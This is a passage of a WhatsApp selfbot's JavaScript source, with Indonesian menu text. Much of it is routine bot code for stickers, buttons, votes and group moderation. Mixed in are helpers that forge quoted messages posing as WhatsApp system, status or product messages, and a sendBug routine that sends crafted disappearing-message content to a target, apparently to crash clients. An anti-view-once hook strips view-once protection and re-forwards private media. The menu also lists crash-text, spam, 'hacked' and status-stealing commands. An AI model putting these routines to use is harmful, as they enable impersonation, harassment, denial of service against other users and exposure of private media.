                 'jpegThumbnail': iye
                        }
                       }
	                  }
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `${ucapanWaktu} ${pushname}`,
                 "title": `${ucapanWaktu} ${pushname}`,
                 'jpegThumbnail': iye
                        }
	                  } 
                     }
    const floc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { locationMessage: { name: fake, jpegThumbnail: thumb } },
    };
    const fakestatus = (teks) => {
      KonX.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "status@broadcast" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const fakethumb = (teks, yes) => {
      KonX.sendMessage(from, teks, image, {
        thumbnail: fs.readFileSync("./stik/fake.jpeg"),
        quoted: mek,
        caption: yes,
      });
    };
    const fakegroup = (teks) => {
      KonX.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const sendStickerFromUrl = async (to, url) => {
      var names = Date.now() / 10000;
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
KonX.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
	   global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
        if (json[2][0][1].live == 'true') charging = true
       if (json[2][0][1].live == 'false') charging = false
        console.log(json[2][0][1])
		console.log('Baterai : ' + batterylevel+'%')
	})
	global.batrei = global.batrei ? global.batrei : []
		KonX.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
		}) 
download(url, "./stik" + names + ".png", async function () {
        console.log("selesai");
        let filess = "./stik" + names + ".png";
        let asw = "./stik" + names + ".webp";
        exec(
          `ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
          (err) => {
            let media = fs.readFileSync(asw);
            KonX.sendMessage(to, media, MessageType.sticker, { quoted: mek });
            fs.unlinkSync(filess);
            fs.unlinkSync(asw);
          }
        );
      });
    };
if (budy.toLowerCase() === `8473`){
		if (isRegister) return 
		    register.push(sender)
		    fs.writeFileSync('./database/user/registered.json', JSON.stringify(register))
		    teks = `Verification success\n\nPlease send *!menu* to view menu`
		    KonX.sendMessage(from, teks, text, {quoted: fkontak })
}          /*if (!mek.key.fromMe && banChats === false) return*/
	              
           
const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }
        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
        }
        
   
//******************* 》banchat《 ********************\\
if (isBanchat){
if (!itsMe && !isOwner)return 
}
    const ftokoo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: fs.readFileSync(`./stik/thumb.jpeg`), //Gambarnye
            },
            title: "FakeReply Bang", //Kasih namalu
            description: "SELF BOT",
            currencyCode: "USD",
            priceAmount1000: "2000",
            retailerId: "ItsMeVall",
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
 const ftok = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": iye //Gambarnye
					},
					"title": `${ucapanWaktu} ${pushname}`, //Kasih namalu 
					"description": `${ucapanWaktu} ${pushname}`, 
					"currencyCode": "USD",
					"priceAmount1000": "2000",
					"retailerId": `${ucapanWaktu} ${pushname}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
    const sendMediaURL = async (to, url, text = "", mids = []) => {
      if (mids.length > 0) {
        text = normalizeMention(to, text, mids);
      }
      const fn = Date.now() / 10000;
      const filename = fn.toString();
      let mime = "";
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          mime = res.headers["content-type"];
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, filename, async function () {
        console.log("done");
        let media = fs.readFileSync(filename);
        let type = mime.split("/")[0] + "Message";
        if (mime === "image/gif") {
          type = MessageType.video;
          mime = Mimetype.gif;
        }
        if (mime.split("/")[0] === "audio") {
          mime = Mimetype.mp4Audio;
        }
        KonX.sendMessage(to, media, type, {
          quoted: mek,
          mimetype: mime,
          caption: text,
          contextInfo: { mentionedJid: mids },
        });

        fs.unlinkSync(filename);
      });
    };
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
///Button Text

const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
KonX.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await KonX.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
KonX.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await KonX.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
KonX.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await KonX.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
KonX.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
    const kick = function (from, orangnya) {
      for (let i of orangnya) {
        KonX.groupRemove(from, [i]);
      }
    };
    const add = function (from, orangnya) {
      KonX.groupAdd(from, orangnya);
    };
        const grupinv = (teks) => {
        	grup = KonX.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `Argio Dev`, "footerText": "*_© Dcode Denpa_*", "jpegThumbnail": iye, "caption": teks}}, {quoted:mek})
            KonX.relayWAMessage(grup)
        }
const fakeitem = (teks) => {
            KonX.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`./stik/thumb.jpeg`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`ItsMeVall`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}
// Katalog
const reply = (teks) => {
             res = KonX.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 999999999, "message": teks, "footerText": "*Naufal tutor*", "thumbnail": bgg, "surface": 'CATALOG' }}, {quoted:mek})
             KonX.relayWAMessage(res)
        }
const fakewa = (teks) => {        
KonX.sendMessage(from, teks, text, { thumbnail: fake, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jam} - ${week} ${weton} - ${date}`,body:"",previewType:"PHOTO",thumbnail:iye,sourceUrl:`https://wa.me/62858157008612?text=Assalamualaikum`}}})
		}
const replyfakelink = (teks) => {
KonX.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `Whatsapp-BOT\nV a L L. (@_KonX) •Instagram photos and Videos`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://a.top4top.io/p_2073icief0.jpg",
                "thumbnail": fake,
                "sourceUrl": ``
},mentionedJid:[sender]}, quoted : fgif})
};
const replywa = (teks) => {
KonX.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `Whatsapp`,
                "body": `wa.me/62858157008612`,
                "mediaType": "10",
                "mediaUrl": `wa.me/62858157008612`,
                "thumbnailUrl": "https://j.top4top.io/p_20682m4yj0.jpg",
                "thumbnail": iye,
                "sourceUrl": `wa.me/62858157008612`,
},mentionedJid:[sender]}, quoted : mek})
};
const fakeyt = (teks) => {
KonX.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `hallo ${pushname}` ,
"body": `${ucapanWaktu}`,
"mediaType": "2",
"thumbnailUrl": "https://c.top4top.io/p_2087f30hj1.jpeg",
"mediaUrl": "https://youtu.be/uygjD8rqVLE",
"thumbnail": fs.readFileSync('./stik/thumb.jpeg'),
"sourceUrl": "",
},mentionedJid:[sender]}, quoted : fgif})
};
// Support Di Versi 3.5.2 
    const sendBug = async (target, teks) => {
      if (!teks) teks = ".";
      await KonX.relayWAMessage(
        KonX.prepareMessageFromContent(
          target,
          KonX.prepareDisappearingMessageSettingContent(0),
          {}
        ),
        { waitForAck: true }
      );
      KonX.sendMessage(target, teks, "conversation");
    };

    //FUNCTION
    function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }

    cekafk(afk);
    if (!mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (isAfk(mek.key.remoteJid)) return;
        addafk(mek.key.remoteJid);
        heheh = ms(Date.now() - waktu);
        KonX.sendMessage(
          mek.key.remoteJid,
          `@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
          MessageType.text,
          {
            contextInfo: {
              mentionedJid: [`${owner}@s.whatsapp.net`],
              stanzaId: "B826873620DD5947E683E3ABE663F263",
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                imageMessage: {
                  caption: "*OFFLINE*",
                  jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                },
              },
            },
          }
        );
      }
    }
    if (mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (mek.message.extendedTextMessage != undefined) {
          if (mek.message.extendedTextMessage.contextInfo != undefined) {
            if (
              mek.message.extendedTextMessage.contextInfo.mentionedJid !=
              undefined
            ) {
              for (let ment of mek.message.extendedTextMessage.contextInfo
                .mentionedJid) {
                if (ment === `${owner}@s.whatsapp.net`) {
                  if (isAfk(mek.key.remoteJid)) return;
                  addafk(mek.key.remoteJid);
                  heheh = ms(Date.now() - waktu);
                  KonX.sendMessage(
                    mek.key.remoteJid,
                    `@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
                    MessageType.text,
                    {
                      contextInfo: {
                        mentionedJid: [`${owner}@s.whatsapp.net`],
                        stanzaId: "B826873620DD5947E683E3ABE663F263",
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                          imageMessage: {
                            caption: "*OFFLINE*",
                            jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                          },
                        },
                      },
                    }
                  );
                }
              }
            }
          }
        }
      }
    }

    //========================================================================================================================//
    colors = ["red", "white", "black", "blue", "yellow", "green"];
    const isMedia = type === "imageMessage" || type === "videoMessage";
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");

/*if (listbut) console.log("[",color("command","lime"),"]",time2,color(listbut,"lime"),"from",color(sender.split("@")[0],"cyan"))*/
//list command

async function sendFileFromUrl(from, url, caption, msg, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return KonX.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
    if (!isGroup && prefix && command)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "args :",
        color(args.length)
      );
    //if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
    if (prefix && command && isGroup)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "in",
        color(groupName),
        "args :",
        color(args.length)
      );
    //if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
    if (isGroup && !isVote) {
      if (budy.toLowerCase() === "vote") {
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6283833310095@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "✅",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      } else if (budy.toLowerCase() === "devote") {
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "62858157008612@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "❌",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      }
    }
    const sendKontak = (from, nomor, nama, org = "") => {
      const vcard =
        "BEGIN:VCARD\n" +
        "VERSION:3.0\n" +
        "FN:" +
        nama +
        "\n" +
        "ORG:" +
        org +
        "\n" +
        "TEL;type=CELL;type=VOICE;waid=" +
        nomor +
        ":+" +
        nomor +
        "\n" +
        "END:VCARD";
      KonX.sendMessage(
        from,
        { displayname: nama, vcard: vcard },
        MessageType.contact,
        { quoted: mek }
      );
    };
    //kasih wm gw ajg kalau make
    if (isGroup && isAntilink && !mek.key.fromMe) {
      if (budy.includes("://chat.whatsapp.com/")) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTILINK DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        KonX.groupRemove(from, [sender]);
      }
    }
    if (isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {
      reply(
        `@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`
      );
      var msg = { ...mek };
      msg.mek = mek.message.viewOnceMessage.message;
      msg.mek[Object.keys(msg.mek)[0]].viewOnce = false;
      KonX.copyNForward(m.chat, msg);
    }
    if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color("[ANTI-HIDETAG]", "red"),
        color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white")
      );
      reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`);
      kick(from, sender);
    }

    if (isGroup && isAntivirtex && !mek.key.fromMe) {
      if (budy.length > 700) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        KonX.groupRemove(from, sender);
      }
    }
    if (isGroup && autojoin == true) {
      if (budy.includes("://chat.whatsapp.com/")) {
        console.log(
          color("[AUTO-JOIN]", "red"),
          color("YAHAHAHHAHAH", "white")
        );
        KonX.query({
          json: [
            "action",
            "invite",
            `${budy.replace("https://chat.whatsapp.com/", "")}`,
          ],
        });
      }
    }
    if (isGroup && isKickarea && !mek.key.fromMe) {
      if (sender.includes("62")) {
        reply("GRUP ONLY +62!");
        KonX.groupRemove(from, [sender]);
      }
    }
    // Runtime Di Bio Bang🌹\\
    let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptime = clockString(_uptime);

await KonX.setStatus(`Mode Bot By Yt Naufal tutor Aktif Selama ${uptime}`).catch((_) => _);
      settingstatus = new Date() * 1;
    }
    if (!mek.key.fromMe && banChats === true) return;
switch (command) {
case 'verify':
if (isRegistered) return (from)
const serialUser = createSerial(18)
	        veri = sender
	        _registered.push(sender)
	        fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
	        addRegisteredUser(sender, serialUser)
	         const jancok = `╭─❒ 「 Verify 」 ❒
├ */ Nama :* ${pushname}
├ */ Nomor :* @${sender.split('@')[0]}
├ */ Seri:* ${serialUser}
├ */ Pengguna:* ${_registered.length}
└❏

*「 {DONE} 」*`
gbutsan = [
{buttonId:`menu`,buttonText:{displayText:'MENU BOT📚'},type:1},
{buttonId:`jadibot`,buttonText:{displayText:'JADI BOT🔥'},type:1},
{buttonId:`sewabot`,buttonText:{displayText:'SEWA BOT INI?🍃'},type:1}
]
mhan = await KonX.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const sendBtnVeryy = {
imageMessage: mhan.message.imageMessage,
contentText:`${jancok}`,
footerText:'Terimakasih Sudah Mendaftar\n*_©Database Bot_*', 
buttons: gbutsan,
headerType: 4
}
KonX.sendMessage(from, sendBtnVeryy, MessageType.buttonsMessage, {quoted:ftrol, contextInfo: { mentionedJid: [sender]}})
	         console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
	    // console.log(e)
        break
        case 'naufal':
        case '1':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6281392502321@s.whatsapp.net"
        dtod = '6281392502321'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
✩ 𝗛𝗮𝗶 𝗞𝗮𝗸 @${sender.split("@")[0]}

info di bawah🗿

 ╭─❒ 🆄🅿🅳🅰🆃🅴 🅼🅴🅽🆄
 ┃⬡ > 🗿 ${prefix}Yt
 ┃⬡ > 🗿 ${prefix}Github
 ┃⬡ > 🗿 ${prefix}Grup
 ┃⬡ > 🗿 ${prefix}Nonaufal
 ┃⬡ > 🗿 ${prefix}Noakmal
 ┃⬡ > 🗿 ${prefix}Noridho
 ┃⬡ > 🗿 ${prefix}Scbot
 ┃⬡ > 🗿 ${prefix}Bot
 ┃⬡ > 🗿 ${prefix}Updatemenu
 ┃⬡ > 🗿 ${prefix}Menu
 └──────────────────❒
 
 
╭─❒ 🆂🅴🅼🆄🅰 🅵🅸🆃🆄🆁 🅱🅾🆃
│ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙊𝙒𝙉𝙀𝙍 シ︎
│>̴ 🚮 ${prefix}off
│>̴ 🚮 ${prefix}isbaileys
│>̴ 🚮 ${prefix}banchat
│>̴ 🚮 ${prefix}unbanchat
│>̴ 🚮 ${prefix}listbc
│>̴ 🚮 ${prefix}setcmd
│>̴ 🚮 ${prefix}delcmd
│>̴ 🚮 ${prefix}listcmd
│>̴ 🚮 ${prefix}restart
│>̴ 🚮 ${prefix}antidelete on|off
│>̴ 🚮 ${prefix}autoketik on|off
│>̴ 🚮 ${prefix}autoread gc in / gc off
│>̴ 🚮 ${prefix}autovn on|off
│>̴ 🚮 ${prefix}anticall on|off
│>̴ 🚮 ${prefix}getcaption
│>̴ 🚮 ${prefix}bugkatalog
│>̴ 🚮 ${prefix}buggc id grup
│>̴ 🚮 ${prefix}okvirtex
│>̴ 🚮 ${prefix}on
│>̴ 🚮 ${prefix}status
│>̴ 🚮 ${prefix}setthumb
│>̴ 🚮 ${prefix}settarget
│>̴ 🚮 ${prefix}setfakeimg
│>̴ 🚮 ${prefix}setreply
│>̴ 🚮 ${prefix}hacked nama
│>̴ 🚮 ${prefix}setprefix
│>̴ 🚮 ${prefix}mode /public-self/
│>̴ 🚮 ${prefix}term <code>
│>̴ 🚮 ${prefix}eval <code>
│>̴ 🚮 ${prefix}colongsw reply
│
│ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙂𝙍𝙐𝙋 シ︎
│
│> 🍃 ${prefix}grup 
│> 🍃 ${prefix}promote 
│> 🍃 ${prefix}demote 
│> 🍃 ${prefix}setdesc
│> 🍃 ${prefix}setname
│> 🍃 ${prefix}nsfw 1/0
│> 🍃 ${prefix}kick 
│> 🍃 ${prefix}add 
│> 🍃 ${prefix}getbio
│> 🍃 ${prefix}getname 
│> 🍃 ${prefix}reminder 
│> 🍃 ${prefix}listonline
│> 🍃 ${prefix}sider reply
│> 🍃 ${prefix}antilink on|off
│> 🍃 ${prefix}tod
│> 🍃 ${prefix}tospam jumlah
│> 🍃 ${prefix}antihidetag on|off
│> 🍃 ${prefix}antiviewonce on|off
│> 🍃 ${prefix}antivirtex on|off
│> 🍃 ${prefix}autojoin on|off
│> 🍃 ${prefix}kickarea
│
│ ⬣ 𝙎𝙏𝙊𝙍𝙀 𝙈𝙀𝙉𝙐 シ︎
│ 
│>🍃 ${prefix}diamondml
│>🍃 ${prefix}diamondff
│>🍃 ${prefix}sesi
│>🍃 ${prefix}pushkon
│>🍃 ${prefix}host
│>🍃 ${prefix}vps
│>🍃 ${prefix}upgopay
│>🍃 ${prefix}jasher
│>🍃 ${prefix}following
│>🍃 ${prefix}logo
│>🍃 ${prefix}unchek
│>🍃 ${prefix}smtp
│ 
│ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙈𝘼𝙆𝙀𝙍 シ︎
│ 
│> 🍃 ${prefix}sticker
│> 🍃 ${prefix}swm author|packname
│> 🍃 ${prefix}take author|packname
│> 🍃 ${prefix}fdeface
│> 🍃 ${prefix}attp teks
│> 🍃 ${prefix}fancytext teks
│> 🍃 ${prefix}emoji 
│> 🍃 ${prefix}halloween teks
│> 🍃 ${prefix}vampire teks
│> 🍃 ${prefix}codetxt teks
│> 🍃 ${prefix}matrix teks
│> 🍃 ${prefix}googletxt
│> 🍃 ${prefix}spiderman teks
│> 🍃 ${prefix}express teks
│> 🍃 ${prefix}maker2d2 teks
│> 🍃 ${prefix}maker2d3 teks
│> 🍃 ${prefix}maker2d4 teks
│> 🍃 ${prefix}golden teks
│> 🍃 ${prefix}flower teks
│> 🍃 ${prefix}dance
│> 🍃 ${prefix}wooden teks
│> 🍃 ${prefix}burn
│> 🍃 ${prefix}glow teks
│> 🍃 ${prefix}summer teks
│> 🍃 ${prefix}neon teks
│> 🍃 ${prefix}coffeecup teks
│> 🍃 ${prefix}coffeecup2 teks
│> 🍃 ${prefix}battlefield teks|teks
│> 🍃 ${prefix}googletxt2 teks
│> 🍃 ${prefix}transformer teks
│> 🍃 ${prefix}nulis teks
│> 🍃 ${prefix}text3d teks
│> 🍃 ${prefix}warrior teks
│ 
│ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 シ︎
│ 
│> 🍃 ${prefix}tomp3
│> 🍃 ${prefix}tomp4
│> 🍃 ${prefix}toimg
│> 🍃 ${prefix}slow
│> 🍃 ${prefix}fast
│> 🍃 ${prefix}reverse
│> 🍃 ${prefix}tourl
│ 
│ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙀𝙍 シ
│ 
│> 🍃 ${prefix}play query
│> 🍃 ${prefix}ytmp4 link
│> 🍃 ${prefix}ytmp3 link
│> 🍃 ${prefix}video query
│> 🍃 ${prefix}instagram link
│> 🍃 ${prefix}twitter
│> 🍃 ${prefix}facebook link
│> 🍃 ${prefix}tiktokdl
│ 
│ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙏𝘼𝙂 シ︎
│ 
│> 🍃 ${prefix}hidetag
│> 🍃 ${prefix}kontag
│> 🍃 ${prefix}sticktag
│> 🍃 ${prefix}totag
│ 
│ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙐𝙋𝙎𝙒 シ︎
│ 
│> 🍃 ${prefix}upswteks
│> 🍃 ${prefix}upswlokasi
│> 🍃 ${prefix}upswsticker
